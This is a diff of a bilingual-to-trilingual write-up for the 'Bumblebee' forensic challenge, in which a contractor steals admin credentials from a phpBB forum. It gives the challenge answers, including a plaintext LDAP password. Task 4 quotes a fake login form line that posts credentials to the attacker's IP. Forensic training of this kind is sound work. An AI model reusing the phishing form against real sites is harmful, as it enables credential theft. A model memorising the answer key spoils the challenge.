@@ -1,7 +1,7 @@
 # Bumblebee [verificar]
 
-> **ES:** Ficha mínima — ver plantilla completa en `../../_PLANIFICACION/PLANTILLA_SHERLOCK.md`.
-> **EN:** Minimal header — see full template at `../../_PLANIFICACION/PLANTILLA_SHERLOCK.md`.
+> **ES:** Sherlock DFIR: contratista externo roba credenciales de admin del foro Forela (phpBB) vía WiFi de invitados — logs + dump sqlite3.
+> **EN:** DFIR sherlock: external contractor steals Forela forum (phpBB) admin credentials over Guest WiFi — logs + sqlite3 dump.
 
 | Campo | Valor |
 |-------|-------|
@@ -10,54 +10,63 @@
 | **Evidencia** | bumblebee.zip |
 | **Soluciones en carpeta** | `index.md` (ficha con tasks) + `Bumblebee_writeup.pdf` + `bumblebee.md` |
 
-
 :::info Sherlock Scenario
 
 An external contractor has accessed the internal forum here at Forela via the Guest WiFi and they appear to have stolen credentials for the administrative user! We have attached some logs from the forum and a full database dump in sqlite3 format to help you in your investigation.
 
-一名外部承包商通过客用 WiFi 访问了 Forela 的内部论坛，似乎窃取了管理员用户的凭证！我们附上了论坛的一些日志和完整的 sqlite3 格式数据库转储文件，以帮助您进行调查。
+> [ZH] 一名外部承包商通过客用 WiFi 访问了 Forela 的内部论坛，似乎窃取了管理员用户的凭证！我们附上了论坛的一些日志和完整的 sqlite3 格式数据库转储文件，以帮助您进行调查。
+> **ES:** Un contratista accedió al foro interno por la WiFi de invitados y habría robado credenciales del admin: investigar con logs + dump sqlite3.
+> **EN:** A contractor reached the internal forum via Guest WiFi and allegedly stole admin credentials: investigate with logs + sqlite3 dump.
 
 :::
 
-## 题目数据
+## 题目数据 / Datos / Data
 
 [bumblebee.zip](./bumblebee.zip)
 
-## Task 1
+## Task 1 — Usuario del contratista / Contractor username
 
-> 外部承包商的用户名是什么？
+> [ZH] 外部承包商的用户名是什么？
+> **ES:** ¿Cuál es el nombre de usuario del contratista externo?
+> **EN:** What is the external contractor's username?
 
-在数据库的 `phpbb_users` 中就可以找到
+En la base de datos, tabla `phpbb_users`:
 
 ```plaintext title="Answer"
 apoole1
 ```
 
-## Task 2
+## Task 2 — IP de registro / Registration IP
 
-> 承包商用来创建其账户的 IP 地址是什么？
+> [ZH] 承包商用来创建其账户的 IP 地址是什么？
+> **ES:** ¿Desde qué IP creó el contratista su cuenta?
+> **EN:** From which IP did the contractor create the account?
 
-同样也在上题的数据库中
+En la misma base de datos anterior:
 
 ```plaintext title="Answer"
 10.10.0.78
 ```
 
-## Task 3
+## Task 3 — Post malicioso / Malicious post
 
-> 承包商制作的恶意帖子的 post_id 是什么？
+> [ZH] 承包商制作的恶意帖子的 post_id 是什么？
+> **ES:** ¿Cuál es el post_id de la publicación maliciosa del contratista?
+> **EN:** What is the post_id of the contractor's malicious post?
 
-在数据库的 `phpbb_posts` 中就可以找到
+En la base de datos, tabla `phpbb_posts`:
 
 ```plaintext title="Answer"
 9
 ```
 
-## Task 4
+## Task 4 — URI de exfiltración / Exfiltration URI
 
-> 凭证窃取器发送数据的完整 URI 是什么？
+> [ZH] 凭证窃取器发送数据的完整 URI 是什么？
+> **ES:** ¿A qué URI completa envía los datos el robador de credenciales?
+> **EN:** To which full URI does the credential stealer send data?
 
-在上一题的数据库中，查看承包商发布的贴子，即可发现
+Revisando el post del contratista se halla un formulario de login falso:
 
 ```html
 <form action="http://10.10.0.78/update.php" method="post" id="login" data-focus="username" target="hiddenframe">
@@ -99,13 +108,13 @@ apoole1
 http://10.10.0.78/update.php
 ```
 
-## Task 5
+## Task 5 — Login como admin (UTC) / Admin login (UTC)
 
-> 承包商何时以管理员身份登录论坛？（协调世界时）
+> [ZH] 承包商何时以管理员身份登录论坛？（协调世界时）
+> **ES:** ¿Cuándo inició sesión el contratista como administrador? (UTC)
+> **EN:** When did the contractor log in as administrator? (UTC)
 
-在数据库的 `phpbb_log` 表中，有一个记录的 `operation` 是 `LOG_ADMIN_AUTH_SUCCESS`，其对应的时间戳是 `1682506392`
-
-将时间戳转换为标准时间格式
+En la tabla `phpbb_log` hay un registro con `operation = LOG_ADMIN_AUTH_SUCCESS` y timestamp `1682506392`:
 
 ```plaintext
 1682506392 --> Wed 26 April 2023 10:53:12 UTC
@@ -115,44 +124,50 @@ http://10.10.0.78/update.php
 26/04/2023 10:53:12
 ```
 
-## Task 6
+## Task 6 — Password LDAP / LDAP password
 
-> 论坛中有用于 LDAP 连接的明文凭据，密码是什么？
+> [ZH] 论坛中有用于 LDAP 连接的明文凭据，密码是什么？
+> **ES:** ¿Cuál es la contraseña en claro de la conexión LDAP del foro?
+> **EN:** What is the forum's plaintext LDAP connection password?
 
-在数据库的 `phpbb_config` 表中，有一份数据 `ldap_password`
+En la tabla `phpbb_config`, dato `ldap_password`:
 
 ```plaintext title="Answer"
 Passw0rd1
 ```
 
-## Task 7
+## Task 7 — User-Agent del admin / Admin user-agent
 
-> 管理员用户的用户代理是什么？
+> [ZH] 管理员用户的用户代理是什么？
+> **ES:** ¿Cuál es el user-agent del usuario administrador?
+> **EN:** What is the administrator's user-agent?
 
-在数据库的 `phpbb_log` 表中，寻找 `operation` 为 `LOG_ADMIN_AUTH_SUCCESS` 的记录，可以找到这两条 ip
+En `phpbb_log`, el registro `LOG_ADMIN_AUTH_SUCCESS` muestra dos IPs:
 
 ```plaintext
 10.255.254.2
 10.10.0.78
 ```
 
-前面已经确定承包商的 ip 为 `10.10.0.78`，那么 `10.255.254.2` 就是管理员用户的 ip，在 `access.log` 中可以找到 `user-agent`
+Ya se estableció que `10.10.0.78` es del contratista, luego `10.255.254.2` es del admin; en `access.log` aparece su user-agent:
 
 ```plaintext title="Answer"
 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
 ```
 
-## Task 8
+## Task 8 — Auto-alta en admins (UTC) / Self-added to admins (UTC)
 
-> 承包商何时将自己添加到管理员组？（协调世界时）
+> [ZH] 承包商何时将自己添加到管理员组？（协调世界时）
+> **ES:** ¿Cuándo se agregó el contratista al grupo de administradores? (UTC)
+> **EN:** When did the contractor add themselves to the administrators group? (UTC)
 
-在数据库的 `phpbb_log` 表中，有一条`operation`为`LOG_USERS_ADDED`的记录，数据为
+En `phpbb_log` hay un registro `LOG_USERS_ADDED` con datos:
 
 ```plaintext
 a:2:{i:0;s:14:"Administrators";i:1;s:6:"apoole";}
 ```
 
-可以断定这一条就是承包商将自己的账户添加进管理员组的记录
+Es el registro del contratista uniéndose al grupo de admins:
 
 ```plaintext
 1682506431 --> Wed 26 April 2023 10:53:51 UTC
@@ -162,11 +177,13 @@ a:2:{i:0;s:14:"Administrators";i:1;s:6:"apoole";}
 26/04/2023 10:53:51
 ```
 
-## Task 9
+## Task 9 — Descarga del backup (UTC) / Backup download (UTC)
 
-> 承包商何时下载了数据库备份？（协调世界时）
+> [ZH] 承包商何时下载了数据库备份？（协调世界时）
+> **ES:** ¿Cuándo descargó el contratista el backup de la base de datos? (UTC)
+> **EN:** When did the contractor download the database backup? (UTC)
 
-在`access.log`文件中，用`backup`作为关键词进行搜索，可以得到这一条记录
+En `access.log`, buscando `backup`:
 
 ```plaintext
 10.10.0.78 - - [26/Apr/2023:12:01:38 +0100] "GET /store/backup_1682506471_dcsr71p7fyijoyq8.sql.gz HTTP/1.1" 200 34707 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0"
@@ -176,11 +193,13 @@ a:2:{i:0;s:14:"Administrators";i:1;s:6:"apoole";}
 26/04/2023 11:01:38
 ```
 
-## Task 10
+## Task 10 — Tamaño del backup / Backup size
 
-> 按照 access.log 中的记录，数据库备份的大小是多少字节？
+> [ZH] 按照 access.log 中的记录，数据库备份的大小是多少字节？
+> **ES:** Según `access.log`, ¿de cuántos bytes es el backup?
+> **EN:** Per `access.log`, how many bytes is the backup?
 
-上一题中就有
+Del registro anterior:
 
 ```plaintext title="Answer"
 34707
